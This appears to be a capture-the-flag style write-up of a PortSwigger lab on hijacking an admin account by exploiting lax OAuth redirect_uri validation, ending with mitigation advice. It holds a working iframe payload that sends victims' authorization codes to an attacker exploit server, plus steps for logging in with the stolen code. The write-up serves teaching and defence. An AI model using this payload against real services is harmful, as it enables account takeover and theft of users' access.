@@ -1,0 +1,78 @@
+OAuth Account Hijacking via redirect_uri
+
+Lab Difficulty: Practitioner
+Vulnerability Type: OAuth Authorization Code Leakage / Insecure Redirect URI Validation
+Lab Link: PortSwigger Lab
+
+Summary
+This lab demonstrates how a misconfiguration in the OAuth provider’s handling of the redirect_uri parameter allows an attacker to steal authorization codes belonging to other users. By exploiting insufficient validation of the redirect_uri, an attacker can intercept authorization codes, complete the OAuth flow as a victim, and gain unauthorized access to their account.
+
+Objective
+Steal an authorization code associated with the administrator account by manipulating the redirect_uri parameter, use the stolen code to log in as the admin, and delete the user carlos.
+
+Technical Walkthrough
+1. Initial Setup and OAuth Flow Analysis
+Logged in with the provided social media account credentials: wiener:peter.
+
+Accessed the blog website’s My account page and completed the OAuth login process, authenticating via the OAuth service.
+
+Logged out and logged back in to verify that the OAuth service maintains an active session, allowing immediate login without re-entering credentials.
+
+Using Burp Proxy, inspected the OAuth authorization request in the proxy history:
+
+
+GET /auth?client_id=[...]
+Noted that this request results in an immediate redirect to the specified redirect_uri along with the authorization code in the query string.
+
+2. Testing Redirect URI Validation
+Sent the authorization request to Burp Repeater to test different redirect_uri values.
+
+Discovered that the OAuth server does not properly validate the redirect_uri parameter and accepts arbitrary URIs without error.
+
+Changed the redirect_uri to point to the attacker-controlled exploit server URL.
+
+Sent the modified request and followed the redirect.
+
+Checked the exploit server’s access logs and confirmed that the authorization code was leaked via the redirect.
+
+3. Creating the Exploit Payload
+On the exploit server, created an iframe to automate code leakage from the victim’s browser:
+
+
+<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+Stored the payload and verified it loaded successfully.
+
+Monitored the exploit server logs to confirm that the iframe triggered an OAuth authorization request and leaked an authorization code.
+
+4. Delivering the Exploit and Capturing the Code
+Delivered the exploit to the victim (the admin), who has an active OAuth session and will load the iframe automatically.
+
+Monitored the exploit server logs and captured the stolen authorization code from the victim’s request.
+
+5. Using the Stolen Authorization Code
+Logged out from the blog website.
+
+Used the stolen authorization code to complete the OAuth callback:
+
+
+https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
+Observed that the OAuth flow completes successfully and logs in as the admin user.
+
+Accessed the admin panel and deleted the user carlos to solve the lab.
+
+Result
+Successfully exploited insecure redirect URI validation in the OAuth flow to hijack an administrator’s account by stealing their authorization code and completing the login process without credentials.
+
+Mitigation
+To protect against this vulnerability:
+
+Strictly validate redirect_uri parameters against a whitelist of pre-registered URIs during authorization requests.
+
+Reject any authorization requests with unrecognized or altered redirect_uri values.
+
+Implement state parameters and other anti-CSRF measures in the OAuth flow.
+
+Use short-lived authorization codes and monitor suspicious activity for code leakage.
+
+Educate developers about secure OAuth implementation best practices.
+
